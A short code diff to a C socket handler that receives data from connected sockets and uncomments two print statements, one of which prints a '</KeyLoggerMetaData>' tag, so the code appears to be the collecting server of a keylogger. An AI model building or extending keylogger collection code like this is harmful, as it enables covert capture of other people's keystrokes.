@@ -101,7 +101,7 @@ void Handler()
                 while(recv(*(link.target),buffer,0x1001,0) !=  SOCKET_ERROR )
                 {
                         *(buffer+0x1000)=0x00;
-                      //  printf("%s",buffer);
+                        printf("%s",buffer);
                 }
                 if (WSAGetLastError() == WSAEWOULDBLOCK)
                 {
@@ -112,7 +112,7 @@ void Handler()
                 }
                 else
                 {
-                  //  printf("\n</KeyLoggerMetaData>\n");
+                    printf("\n</KeyLoggerMetaData>\n");
                     SOCKETLIST temp = *(link.nextTarget);
                    if( link.target == temp.target)
                     {
